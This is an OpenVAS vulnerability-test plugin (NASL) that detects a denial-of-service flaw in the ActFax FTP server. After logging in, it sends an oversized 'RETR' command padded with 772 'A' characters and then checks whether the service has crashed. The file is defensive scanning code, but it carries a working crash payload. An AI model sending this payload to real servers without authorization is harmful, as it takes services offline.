###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_actfax_ftp_retr_cmd_dos_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# ActFax FTP Server Post Auth 'RETR' Command Denial of Service Vulnerability
#
# Authors:
# Veerendra G.G <veernedragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow the remote attackers to cause a denial of
  service.
  Impact Level: Application";
tag_affected = "ActiveFax Version 4.25 (Build 0221), Other versions may also be affected.";
tag_insight = "The flaw is due to an error while parsing RETR command, which can
  be exploited to crash the FTP service by sending big parameter to 'RETR'
  command.";
tag_solution = "No solution or patch is available as of 21st February, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.actfax.com/";
tag_summary = "The host is running ActFax FTP Server and is prone to denial of service
  vulnerability.";

if(description)
{
  script_id(900271);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-02-23 12:24:37 +0100 (Wed, 23 Feb 2011)");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_name("ActFax FTP Server Post Auth 'RETR' Command Denial of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/16177/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/98540/actfax-overflow.txt");

  script_description(desc);
  script_summary("Determine if ActiveFaxFTP is prone to denial of service vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("FTP");
  script_require_ports("Services/ftp", 21);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("ftp_func.inc");

actFaxPort = get_kb_item("Services/ftp");
if(!actFaxPort){
  actFaxPort = 21;
}

## Check Port status
if(!get_port_state(actFaxPort)){
  exit(0);
}

## Confirm the Application
banner = get_ftp_banner(port:actFaxPort);
if("220 ActiveFax" >!< banner){
  exit(0);
}

## Get Username from KB, If not given use default Username
user = get_kb_item("ftp/login");
if(!user){
  user = "unknown";
}

## Get Password from KB, If not given use default Password
pass = get_kb_item("ftp/password");
if(!pass){
  pass = "";
}

flag = 0;

for(i=0; i<3 ; i++)
{
  ## Open the socket
  soc1 = open_sock_tcp(actFaxPort);

  ## Exit if it's not able to open socket first time
  if(!soc1 && flag == 0){
    exit(0);
  }

  ## Check Login is successful or not
  ftplogin = ftp_log_in(socket:soc1, user:user, pass:pass);

  ## Exit if it's not able to login first time
  if(!ftplogin && flag == 0){
    exit(0);
  }

  flag = 1;

  ## For the second time it's not able to open the socket or
  ## not able to login means server is crashed
  if (!ftplogin || !soc1)
  {
    security_hole(actFaxPort);
    exit(0);
  }

  ## Send specially crafted RETR command
  send(socket:soc1, data:string("RETR ", crap(length: 772, data:"A"), '\r\n'));

  ## Close FTP Socket
  ftp_close(socket:soc1);
}

sleep(3);

## Server is crashed if not able to open the socket
## or not able to get the banner
soc2 = open_sock_tcp(actFaxPort);
if(!soc2)
{
  security_hole(actFaxPort);
  exit(0);
}

resp = ftp_recv_line(socket:soc2);
if("220 ActiveFax" >!< resp)
{
  security_hole(actFaxPort);
  exit(0);
}

## Close FTP Socket
ftp_close(socket:soc2);
